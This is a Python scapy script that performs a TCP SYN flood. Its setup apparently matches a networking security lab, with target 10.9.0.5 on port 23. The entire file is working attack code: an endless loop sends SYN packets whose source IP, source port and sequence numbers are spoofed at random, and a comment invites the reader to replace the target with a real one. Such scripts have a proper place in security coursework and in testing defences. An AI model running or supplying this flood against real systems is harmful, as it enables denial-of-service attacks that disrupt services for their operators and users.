#!/usr/bin/python3
from scapy.all import IP, TCP, send
from ipaddress import IPv4Address
from random import getrandbits

# Define the target machine's IP and port
target_ip = "10.9.0.5"  # Replace with the actual target IP
target_port = 23  # Replace with the actual target port

# Create base packet template
ip = IP(dst=target_ip)
tcp = TCP(dport=target_port, flags='S')
pkt = ip / tcp

# Infinite loop to send packets continuously
while True:
    pkt[IP].src = str(IPv4Address(getrandbits(32)))  # Randomized source IP
    pkt[TCP].sport = getrandbits(16)  # Randomized source port
    pkt[TCP].seq = getrandbits(32)  # Randomized sequence number
    send(pkt, verbose=0)